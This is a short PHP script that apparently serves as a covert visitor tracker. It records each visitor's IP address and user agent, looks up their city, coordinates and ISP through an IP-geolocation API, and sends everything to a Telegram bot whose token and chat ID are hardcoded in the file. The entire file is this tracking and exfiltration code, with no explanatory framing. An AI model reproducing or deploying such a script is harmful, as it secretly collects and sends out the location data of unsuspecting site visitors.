

<?php
if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP']; }
$ip = $_SERVER['REMOTE_ADDR'];
$ua =  $_SERVER['HTTP_USER_AGENT'];

$api = json_decode(file_get_contents('http://free.ipwhois.io/json/'.$ip), true);
$country = $api['country'];
$region = $api['region'];
$city = $api['city'];

$latitude = $api['latitude'];
$longitude = $api['longitude'];
$isp = $api['isp'];



$client = '669186959';

file_get_contents('https://api.telegram.org/bot1212840462:AAHqN3k3-hm306w9pZUtlGf_YYnq5KcygzQ/sendMessage?chat_id=669186959&parse_mode=html&text='.urlencode($ip."\n".$county.$region."\n".$city."\n".$latitude."\n".$longitude."\n".$isp."\n\n".$ua));
